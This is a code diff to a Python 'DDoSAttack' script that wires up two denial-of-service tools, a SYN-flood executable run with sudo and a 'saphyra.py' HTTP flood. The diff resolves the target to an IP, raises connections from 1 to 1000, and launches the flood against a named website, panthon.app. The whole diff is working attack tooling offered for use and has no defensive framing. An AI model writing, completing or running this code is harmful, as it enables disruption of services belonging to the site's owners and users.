@@ -27,10 +27,7 @@ class DDoSAttack:
         self.model = RandomStringGenerator(100)
 
     def create_connection(self):
-        for _ in range(self.num_connections):
-            thread = threading.Thread(target=self.run_attack)
-            self.threads.append(thread)
-            thread.start()
+        self.run_attack()
 
     def run_attack(self):
         if self.attack_type == "asyncrone":
@@ -59,24 +56,32 @@ class DDoSAttack:
         # aSYNcronemacARM <source port> <target IP> <target port> <threads number>
         parsed_url = urlparse(self.target_url)
         hostname = parsed_url.netloc
-        socket.gethostbyname(hostname)
+        ip = socket.gethostbyname(hostname)
         command = [
             "sudo",
-            "-S",
             path_to_executable,
             "80",
-            self.target_url,
+            ip,
             str(self.target_port),
             str(self.num_connections),
         ]
         try:
-            subprocess.run(command, check=True)
+            subprocess.run(command)
         except subprocess.CalledProcessError as e:
             logging.error(f"Error while running aSYNcrone: {e}")
             return
 
     def saphyra_attack(self):
-        os.path.join(os.path.dirname(__file__), "saphyra")
+        command = [
+            "python3",
+            os.path.join(os.path.dirname(__file__), "saphyra.py"),
+            self.target_url
+        ]
+        try:
+            subprocess.run(command)
+        except subprocess.CalledProcessError as e:
+            logging.error(f"Error while running saphyra: {e}")
+            return
 
     def wait_for_threads(self):
         for thread in self.threads:
@@ -86,9 +91,9 @@ class DDoSAttack:
 # Target parameters
 target_url = "https://panthon.app"
 target_port = 80
-num_connections = 1
+num_connections = 1000
 
 # Create and launch attack
-attack = DDoSAttack(target_url, target_port, num_connections, "asyncrone")
+attack = DDoSAttack(target_url, target_port, num_connections, "saphyra")
 attack.create_connection()
 attack.wait_for_threads()
